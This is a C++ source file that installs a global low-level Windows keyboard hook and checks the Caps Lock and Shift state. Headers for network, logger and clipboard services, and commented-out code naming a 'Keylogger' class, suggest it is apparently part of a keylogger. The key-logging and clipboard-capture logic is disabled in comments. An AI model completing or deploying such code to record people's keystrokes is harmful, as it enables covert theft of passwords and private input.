#include "system_hook.h"

#include <dry/system_hook/services/logger/logger.h>
#include <dry/system_hook/services/network/network.h>
#include <dry/system_hook/services/informer/informer.h>
#include <dry/system_hook/services/keyboard/keyboard.h>
#include <dry/system_hook/services/clipboard/clipboard.h>

Services SystemHook::_services;

LRESULT CALLBACK hook_procedure(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (wParam == WM_KEYDOWN)
    {
        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
        unsigned int scan = MapVirtualKey(p->vkCode, 0);
        scan <<= 16;

        const bool is_ascii = p->vkCode <= 32;
        if (!is_ascii)
            scan |= 0x1 << 24;
        
        //TCHAR buf[16];
        //GetKeyNameText(scan, buf, 16);
        //
        //std::wstring key = buf;
        //
        //if (!Keylogger::is_caps())
        //    std::transform(key.begin(), key.end(), key.begin(), ::tolower);
        //
        //const auto value = l10n.translate(key);
        //if (value.empty())
        //    logger << key;
        //else
        //    logger << value;
    }
    if (wParam == WM_COPY)
    {
        //ClipboardShared& clipboard = SystemHook::_services.get<Clipboard>();
        //std::cout << _clipboard.get() << std::endl;
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void SystemHook::trap(HINSTANCE instance)
{
    /*auto& log = _services.get<Logger>();
    if (log)
        (*log) << Logger::time_now() << std::endl;*/
    _keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, hook_procedure, instance, 0);
}

void SystemHook::leave()
{
    UnhookWindowsHookEx(_keyboard_hook);
}

bool SystemHook::is_caps()
{
    const bool is_capital = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
    const bool is_shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
    return is_shift || is_capital;
}